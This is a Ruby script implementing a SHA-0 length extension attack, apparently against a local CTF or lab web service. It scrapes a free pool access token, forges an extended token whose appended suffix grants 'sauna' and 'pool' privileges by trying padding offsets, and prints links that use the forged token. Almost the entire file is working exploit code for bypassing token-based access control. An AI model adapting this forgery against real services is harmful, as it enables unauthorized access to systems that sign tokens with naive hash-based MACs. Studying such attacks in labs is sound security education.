require 'httpx'     # Make HTTP requests
require 'nokogiri'  # Parse HTML for free pool link
require 'cifroteko' # Get one round of SHA-0, and padding with offset
# require '../../../../../../cifroteko/lib/cifroteko'
require 'pry' # Use to stop in weird places and examine situation

class LengthEtensionAttackExploit
  def initialize(target:)
    @httpx = HTTPX.plugin(:compression)
                  .with(origin: target)
                  .with_headers('User-Agent' => 'Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0')
    @digest = Cifroteko::Digest::Sha0 # we know it's SHA-0 from the sauce
  end

  def get_free_pool_token
    html = @httpx.get('/promo/').to_s # Get HTML
    doc = Nokogiri::HTML(html)        # Parse
    a = doc.xpath('/html/body/center/a') # Get anchor
    token = a.attr('href').value.split('/').last.from_hex # Cut out the token from the link
  end

  def test_token(raw_token, location='/pool/')
    ans = @httpx.get(location + raw_token.to_hex).to_s
    # puts ans
    return !ans.include?('You must have a valid subscription')
  end

  def test_token_pool(raw_token) ; test_token(raw_token,'/pool/') ; end
  def test_token_sauna(raw_token); test_token(raw_token,'/sauna/'); end

  def add_suffix(raw_token:, suffix:, offsets_to_check:)
    hash = raw_token[...20]
    msg = raw_token[20...]

    offsets_to_check.each do |ofs|
      # Generating new message with suffix
      msg_pad = @digest.pad(msg, offset: ofs).as_str
      msg_pad_suffix = msg_pad + suffix

      #=== Generating new hash ===

      msg_pad_suffix_pad = @digest.pad(msg_pad_suffix, offset: ofs ).as_str

      # Copied from lib/cifroteko/scheme/md_construct.rb
      in_state = @digest.divide(hash)
      out_state = []

      msg_pad_suffix_pad[msg_pad.length...].bytes.each_slice(@digest::InternalBlockSize) do |chunk|
        out_state = @digest.process_chunk(chunk, in_state)

        in_state = in_state.zip(out_state).map { |i,o| (i+o) & 0xffffffff }
      end

      # Final token formatting
      #
      out_hash = @digest.merge(in_state)
      out_msg = msg_pad_suffix

      out_token = "#{out_hash}#{out_msg}"

      # puts "Tesing offset: #{ofs.to_s.rjust(2,'0')} ; Token: #{out_token.inspect}"
      if test_token_pool(out_token)
        return out_token
      end
    end

    return nil
  end

  def exploit!(things_to_hack: ['sauna','pool'])
    token = get_free_pool_token
    raise 'Got invalid token' unless test_token(token) # Test token to make sure it works

    puts "Got free pool token : #{token.inspect}"
    # => Got free pool token : "\xB8c\xEA\x9A\xD4.r\xDB\\\xC1D+~\x9C\xE0\xDC\xA7\xBF\x82vAnon_3d51491e|pool"

    new_token = add_suffix(raw_token: token,
                           offsets_to_check: 0..32,
                           suffix: ",#{things_to_hack.join(',')},"  )

    if new_token.nil?
      puts "Attack Failed"
      return nil
    else
      puts "Attack succeded, new token is #{new_token.inspect}"
      return new_token
    end
  end
end

target_url = 'http://localhost:9999'
lea = LengthEtensionAttackExploit.new(target: target_url)
tth = [
  'all the things',
  'all the booze',
  'the planet',
  'sauna',
  'pool',
  'ur mom'
]

if new_token = lea.exploit!(things_to_hack: tth)
  puts "
Here's your test link:
    #{target_url}/debug/test/#{new_token.to_hex}
And link directly to the sauna
    #{target_url}/sauna/#{new_token.to_hex}
"
end
